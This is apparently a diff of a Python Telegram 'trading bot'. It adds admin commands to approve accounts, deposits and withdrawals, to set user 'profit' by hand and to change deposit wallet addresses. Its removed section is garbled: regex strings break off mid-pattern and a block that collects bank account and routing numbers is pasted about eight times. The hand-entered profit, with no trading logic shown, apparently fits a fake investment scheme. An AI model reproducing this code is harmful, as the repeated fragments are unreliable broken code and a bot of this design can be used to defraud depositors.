+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
 
-✅ **Approve User**: Automatically done via buttons
-💳 **Approve Deposit**: Automatically done via buttons  
-💸 **Approve Withdrawal**: Automatically done via buttons
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
 
-📈 **Update Profit**:
-/updateprofit <user_id> <amount>
-Example: /updateprofit 123456789 250.75
+✅ **Approve User**
+- Approve a user's account to grant access to trading features.
+- Command: /approveuser <user_id>
+- Example: /approveuser 123456789
 
-🪙 **Update Crypto Address**:
-/updatecrypto <crypto_name> <address>
-Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+💳 **Approve Deposit**
+- Confirm a user's deposit to update their balance.
+- Command: /approve <user_id> <amount>
+- Example: /approve 123456789 1000.50
+- Alternatively, use the 'Approve' button in deposit notifications.
 
-📋 **Other Commands**:
-/listusers - List all users
-/getid - Get user ID (for users only)
+💸 **Approve Withdrawal**
+- Process a user's withdrawal request.
+- Command: /approvewithdrawal <user_id> <amount>
+- Example: /approvewithdrawal 123456789 500.25
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
 
 **Tips:**
-- Approval requests come with clickable buttons
-- All commands are case-sensitive
-- User notifications are sent automatically"""
-        await query.edit_message_text(help_text, parse_mode='Markdown')
+- Use /getid to find a user's ID.
+- Check deposit notifications for pending approvals.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
 
-# Admin command functions
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id = int(args[0])
+        amount = float(args[1])
+        
+        if user_id not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id = int(args[0])
+        amount = float(args[1])
+        
+        if user_id not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
 async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Admin command to update user profits"""
     user_id = update.effective_user.id
@@ -1094,6 +1296,41 @@ async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TY
     except IndexError:
         await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
 
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id = int(args[0])
+        
+        if user_id not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id]
+        user_info['approved'] = True
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now visit our website and use all trading features."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
 async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Admin command to list all users"""
     user_id = update.effective_user.id
@@ -1130,7 +1367,11 @@ Below is a detailed list of all registered users:\n\n"""
     if len(users_list) > 4000:
         parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
         for part in parts:
-            await update.message.reply_text(part, parse_mode='Markdown')
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=part,
+                parse_mode='Markdown'
+            )
     else:
         await update.message.reply_text(users_list, parse_mode='Markdown')
 
@@ -1143,29 +1384,45 @@ async def admin_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
     
     help_text = """🛠 **Admin Panel Guide** 🛠
 
-Available commands:
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
 
-✅ **Approve User**: Automatically done via buttons
-💳 **Approve Deposit**: Automatically done via buttons  
-💸 **Approve Withdrawal**: Automatically done via buttons
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
 
-📈 **Update Profit**:
-/updateprofit <user_id> <amount>
-Example: /updateprofit 123456789 250.75
+✅ **Approve User**
+- Approve a user's account to grant access to trading features.
+- Command: /approveuser <user_id>
+- Example: /approveuser 123456789
 
-🪙 **Update Crypto Address**:
-/updatecrypto <crypto_name> <address>
-Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+💳 **Approve Deposit**
+- Confirm a user's deposit to update their balance.
+- Command: /approve <user_id> <amount>
+- Example: /approve 123456789 1000.50
+- Alternatively, use the 'Approve' button in deposit notifications.
 
-📋 **Other Commands**:
-/listusers - List all users
-/adminpanel - Show admin panel
-/adminhelp - Show this help
+💸 **Approve Withdrawal**
+- Process a user's withdrawal request.
+- Command: /approvewithdrawal <user_id> <amount>
+- Example: /approvewithdrawal 123456789 500.25
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
 
 **Tips:**
-- Approval requests come with clickable buttons
-- All commands are case-sensitive
-- User notifications are sent automatically"""
+- Use /getid to find a user's ID.
+- Check deposit notifications for pending approvals.
+- All commands are case-sensitive."""
     
     await update.message.reply_text(help_text, parse_mode='Markdown')
 
@@ -1173,10 +1430,13 @@ async def send_admin_panel(context: ContextTypes.DEFAULT_TYPE) -> None:
     """Send admin panel to admin on bot startup"""
     panel_text = """🛠 **NCW Trading Bot Admin Panel** 🛠
 
-Bot started successfully! Welcome to the admin control center."""
+Welcome to the admin control center. Manage users, transactions, and system settings below."""
     
     keyboard = [
         [InlineKeyboardButton("👥 List Users", callback_data='admin_list_users')],
+        [InlineKeyboardButton("✅ Approve User", callback_data='admin_approve_user')],
+        [InlineKeyboardButton("💳 Approve Deposit", callback_data='admin_approve_deposit')],
+        [InlineKeyboardButton("💸 Approve Withdrawal", callback_data='admin_approve_withdrawal')],
         [InlineKeyboardButton("📈 Update Profit", callback_data='admin_update_profit')],
         [InlineKeyboardButton("🪙 Update Crypto Address", callback_data='admin_update_crypto')],
         [InlineKeyboardButton("ℹ️ Help", callback_data='admin_help')]
@@ -1220,2643 +1480,92 @@ def main() -> None:
     conv_handler = ConversationHandler(
         entry_points=[
             CommandHandler("start", start),
+            CommandHandler("adminpanel", admin_panel),
         ],
         states={
             WAITING_NAME: [
-                CallbackQueryHandler(start_registration, pattern='^start_registration
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
+                CallbackQueryHandler(start_registration, pattern='^start_registration$'),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_name),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
             ],
             WAITING_EMAIL: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_email),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
             ],
             WAITING_PHONE: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
             ],
             MAIN_MENU: [
-                CallbackQueryHandler(show_main_menu, pattern='^proceed_to_menu
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
-                CallbackQueryHandler(back_to_menu, pattern='^back_to_menu
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
-                CallbackQueryHandler(refresh_balance, pattern='^refresh_balance
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
-                CallbackQueryHandler(visit_website, pattern='^visit_website
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
